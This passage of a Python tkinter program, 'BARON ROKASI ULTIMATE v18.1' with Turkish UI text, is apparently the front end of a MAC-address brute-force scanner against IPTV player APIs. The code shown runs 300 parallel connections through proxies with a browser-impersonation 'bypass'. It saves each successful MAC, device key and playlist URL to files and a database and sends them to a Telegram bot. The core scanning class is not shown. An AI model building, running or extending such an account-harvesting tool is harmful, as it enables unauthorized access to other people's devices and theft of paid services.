        animate(20)

    def update_graphs_timer(self):
        if self.running and self.scanner:
            current_time = time.time()
            if current_time - self.last_graph_update >= 1.0:
                elapsed = current_time - self.start_time
                speed = self.scanner.processed / elapsed if elapsed > 0 else 0
                
                self.graphs.update_graphs(
                    self.scanner.api_stats,
                    dict(self.scanner.prefix_stats),
                    self.scanner.processed,
                    self.scanner.hits,
                    speed
                )
                self.last_graph_update = current_time
        
        self.root.after(500, self.update_graphs_timer)

    def update_stats_ui(self, processed, total, hits):
        elapsed = time.time() - self.start_time
        speed = processed / elapsed if elapsed > 0 else 0
        success = (hits / processed * 100) if processed > 0 else 0
        
        def _update():
            self.progress.config(value=(processed/total)*100 if total > 0 else 0)
            self.lbl_proc.config(text=f"{processed:,}")
            self.lbl_hits.config(text=str(hits))
            self.lbl_speed.config(text=f"{speed:.1f} MAC/sn")
            self.lbl_success.config(text=f"%{success:.2f}")
            
            if self.scanner:
                self.lbl_v1.config(text=f"V1: {self.scanner.api_stats.get('V1', 0)}")
                self.lbl_v2.config(text=f"V2: {self.scanner.api_stats.get('V2', 0)}")
                self.lbl_v3.config(text=f"V3: {self.scanner.api_stats.get('V3', 0)}")
        
        self.root.after(0, _update)

    def browse_file(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            self.file_path.set(path)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    count = sum(1 for l in f if l.strip())
                self.log(f"📁 {os.path.basename(path)} | {count:,} MAC yuklendi", "info")
            except:
                pass

    def start_scan(self):
        if self.running:
            messagebox.showwarning("Uyari", "Tarama zaten devam ediyor!")
            return
        
        path = self.file_path.get()
        if not path or not os.path.exists(path):
            messagebox.showerror("Hata", "Gecerli bir MAC dosyasi secin!")
            return
        
        self.log_text.delete(1.0, tk.END)
        
        self.log("=" * 55, "gold")
        self.log("  👑 BARON ROKASI ULTIMATE v18.1 👑", "title")
        self.log("  Altin & Safir & Yakut Full Package", "sapphire")
        self.log("=" * 55, "gold")
        self.log("")
        
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                raw_macs = [l.strip() for l in f if l.strip()]
            
            mac_set = set()
            invalid = 0
            for m in raw_macs:
                norm = normalize_mac(m)
                if norm:
                    mac_set.add(norm)
                else:
                    mac_set.add(m.upper())
                    invalid += 1
            
            macs = list(mac_set)
            
            self.log(f"✅ {len(macs):,} benzersiz MAC yuklendi", "info")
            if invalid > 0:
                self.log(f"⚠️  {invalid:,} gecersiz format", "info")
            self.log(f"⚡ Paralel Baglanti: 300", "info")
            self.log(f"🌐 Calisan Proxy: {len(PROXY_MANAGER.working_proxies):,}", "info")
            self.log(f"🛡️  Bypass: curl_cffi (Chrome 120)", "info")
            self.log(f"📱 Telegram: {'Aktif' if TELEGRAM_BOT_TOKEN else 'Pasif'}", "info")
            self.log(f"💾 Veritabani: {DB_PATH}", "info")
            self.log("-" * 55, "gold")
            self.log("🚀 ULTRA DERIN TARAMA BASLATILDI!", "title")
            self.log("")
            
            self.running = True
            self.btn_stop.config(state="normal")
            self.hit_counter = 0
            self.start_time = time.time()
            self.last_graph_update = 0
            
            threading.Thread(target=self.run_scan, args=(macs,), daemon=True).start()
            
        except Exception as e:
            self.log(f"❌ Hata: {str(e)}", "error")

    def run_scan(self, macs):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.async_scan(macs))
        except Exception as e:
            error_msg = str(e)
            self.root.after(0, lambda msg=error_msg: self.log(f"❌ KRITIK HATA: {msg}", "error"))
        finally:
            loop.close()

    async def async_scan(self, macs):
        self.scanner = UltraScanner(macs, max_concurrent=300)
        
        def progress_cb(cur, total, hits):
            self.update_stats_ui(cur, total, hits)
        
        def result_cb(mac, result):
            normalized, device_key, urls, api_version = result
            self.hit_counter += 1
            
            # Veritabanına kaydet
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                prefix = ":".join(normalized.split(":")[:3])
                
                for url in urls:
                    cursor.execute('''
                        INSERT INTO hits (mac, device_key, url, api_version, prefix)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (normalized, device_key, url, api_version, prefix))
                
                cursor.execute(f'UPDATE stats SET total_hits = total_hits + 1, {api_version.lower()}_hits = {api_version.lower()}_hits + 1')
                
                cursor.execute('''
                    INSERT INTO prefix_analysis (prefix, hit_count, scan_count, success_rate)
                    VALUES (?, 1, 1, 100.0)
                    ON CONFLICT(prefix) DO UPDATE SET
                        hit_count = hit_count + 1,
                        scan_count = scan_count + 1,
                        success_rate = (hit_count * 100.0) / scan_count
                ''', (prefix,))
                
                conn.commit()
                conn.close()
            except:
                pass
            
            # Dosyaya kaydet
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            hit_file = os.path.join(IBO_HITS_DIR, f"HIT_{timestamp}_{self.hit_counter}.txt")
            with open(hit_file, "w", encoding="utf-8") as f:
                f.write(f"HIT #{self.hit_counter}\n")
                f.write(f"MAC: {normalized}\n")
                f.write(f"Device: {device_key}\n")
                f.write(f"API: {api_version}\n")
                f.write(f"Zaman: {datetime.now()}\n")
                f.write("-" * 40 + "\n")
                for url in urls:
                    f.write(f"{url}\n")
            
            # Tüm hitler tek dosyada
            with open(os.path.join(IBO_HITS_DIR, "TUM_HITLER.txt"), "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] #{self.hit_counter} | {normalized} | {api_version}\n")
                for url in urls:
                    f.write(f"  -> {url}\n")
                f.write("\n")
            
            # Telegram bildirimi
            send_telegram(normalized, device_key, urls)
            
            # Log
            self.log(f"💎 [HIT #{self.hit_counter}] {normalized} | {api_version}", "hit")
            for url in urls:
                self.log(f"   🔗 {url}", "url")
            self.log("-" * 55, "gold")
        
        await self.scanner.scan_all(progress_cb, result_cb)
        self.root.after(0, self.finish_scan)

    def finish_scan(self):
        elapsed = time.time() - self.start_time
        self.running = False
        self.btn_stop.config(state="disabled")
        
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('UPDATE stats SET last_scan = ?', (datetime.now(),))
            if self.scanner:
                cursor.execute(f'UPDATE stats SET total_scanned = total_scanned + {self.scanner.processed}')
            conn.commit()
            conn.close()
        except:
            pass
        
        self.log("")
        self.log("=" * 55, "gold")
        self.log("  👑 TARAMA TAMAMLANDI! 👑", "title")
        self.log(f"  Toplam Hit: {self.hit_counter}", "hit")
        self.log(f"  Sure: {elapsed:.1f} saniye", "sapphire")
        
        if self.scanner:
            self.log(f"  V1: {self.scanner.api_stats.get('V1', 0)} | V2: {self.scanner.api_stats.get('V2', 0)} | V3: {self.scanner.api_stats.get('V3', 0)}", "info")
        
        self.log(f"  Kayit: {IBO_HITS_DIR}", "info")
        self.log("=" * 55, "gold")
        
        messagebox.showinfo("✅ Tamamlandi",
                          f"Ultra Derin Tarama Tamamlandi!\n\n"
                          f"🎯 Hit: {self.hit_counter}\n"
                          f"⏱️  Sure: {elapsed:.1f} sn\n"
                          f"📁 Kayit: {IBO_HITS_DIR}\n"
                          f"💾 Veritabani: {DB_PATH}")

    def stop_scan(self):
        if self.scanner:
            self.log("⏹ DURDURULUYOR...", "error")
            self.scanner.stop_flag = True

if __name__ == "__main__":
    print("🚀 BARON ROKASI ULTIMATE v18.1 baslatiliyor...")
    print("♦ Altin & Safir & Yakut Full Package ♦")
    print("")
    root = tk.Tk()
    app = BaronRokasiApp(root)
    root.mainloop()